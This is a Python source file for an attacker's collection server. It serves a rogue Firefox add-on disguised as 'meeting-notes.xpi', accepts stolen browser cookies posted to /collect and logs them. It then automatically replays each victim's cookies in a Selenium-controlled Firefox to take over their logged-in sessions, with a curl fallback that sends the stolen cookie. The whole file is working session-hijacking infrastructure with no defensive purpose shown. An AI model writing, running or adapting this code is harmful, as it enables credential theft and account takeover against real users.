from http.server import BaseHTTPRequestHandler, HTTPServer
import json, datetime, threading, time

LOG_FILE = "collected.jsonl"
XPI_FILE = "meeting-notes.xpi"

# ============ AUTO-REPLAY CONFIG ============
AUTO_REPLAY    = True
GRACE_PERIOD   = 8
IGNORE_DOMAINS = {
    "mozilla.org", "firefox.com", "accounts.firefox.com",
    "google.com", "youtube.com", "bing.com",
    "localhost", "attacker.org",
}
# ============================================

cookies_cache = {}
timers        = {}
drivers       = {}
lock = threading.Lock()

def log_event(src, data):
    entry = {"time": datetime.datetime.now().isoformat(), "src": src, "data": data}
    print(f"\n=== [{entry['time']}] {src} ===")
    print(json.dumps(data, indent=2, ensure_ascii=False))
    print("=" * 40 + "\n")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

def norm(d):
    return d.lstrip(".").lower()

def maybe_replay(data):
    if not AUTO_REPLAY or data.get("type") != "cookie":
        return
    c = data.get("cookie", {})
    dom = norm(c.get("domain", ""))
    if not dom or dom in IGNORE_DOMAINS:
        return

    with lock:
        cookies_cache.setdefault(dom, {})[c["name"]] = c
        if dom not in timers:
            timers[dom] = threading.Timer(GRACE_PERIOD, do_replay, args=(dom,))
            timers[dom].start()

def do_replay(dom):
    with lock:
        batch = list(cookies_cache.get(dom, {}).values())
        timers.pop(dom, None)
    if not batch:
        return

    url = "http://" + dom + "/"
    print(f"[REPLAY] Session captured for '{dom}' ({len(batch)} cookies) — opening Firefox...")
    try:
        from selenium import webdriver
        from selenium.webdriver.firefox.options import Options

        driver = drivers.get(dom)
        if driver is None:
            driver = webdriver.Firefox(options=Options())
            drivers[dom] = driver
            driver.get(url)

        for c in batch:
            try:
                driver.add_cookie({
                    "name": c["name"], "value": c["value"],
                    "domain": c["domain"], "path": c.get("path", "/"),
                    "httpOnly": c.get("httpOnly", False),
                    "secure": c.get("secure", False),
                })
            except Exception as e:
                print(f"[REPLAY]   skip {c['name']}: {e}")
        driver.get(url)
        print(f"[REPLAY] '{dom}' is now OPEN in Firefox with the victim's session.")
    except Exception as e:
        print(f"[REPLAY] FAILED for '{dom}': {e}")
        print(f"[REPLAY] Fallback: curl -H \"Cookie: {batch[0]['name']}={batch[0]['value']}\" {url}")

class H(BaseHTTPRequestHandler):
    def _respond(self, code, body=b"", ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_GET(self):
        if self.path == "/health":
            self._respond(200, b'{"status":"up"}')
        elif self.path == "/meeting-notes.xpi":
            try:
                with open(XPI_FILE, "rb") as f:
                    self._respond(200, f.read(), "application/x-xpinstall")
            except FileNotFoundError:
                self._respond(404)
        else:
            self._respond(404)

    def do_POST(self):
        if self.path != "/collect":
            self._respond(404); return
        try:
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n).decode(errors="replace")
            data = json.loads(raw)
        except Exception as e:
            log_event(self.client_address[0], {"parse_error": str(e)})
            self._respond(400, b'{"ok":false}'); return
        log_event(self.client_address[0], data)
        maybe_replay(data)
        self._respond(200, b'{"ok":true}')

    def log_message(self, fmt, *args):
        with open("access.log", "a") as f:
            f.write("%s - %s\n" % (self.client_address[0], fmt % args))

if __name__ == "__main__":
    print(f"[+] Collector on 0.0.0.0:8080 — logging to {LOG_FILE}")
    print(f"[+] Auto-replay: ON (grace {GRACE_PERIOD}s, {len(IGNORE_DOMAINS)} domains ignored)")
    HTTPServer(("0.0.0.0", 8080), H).serve_forever()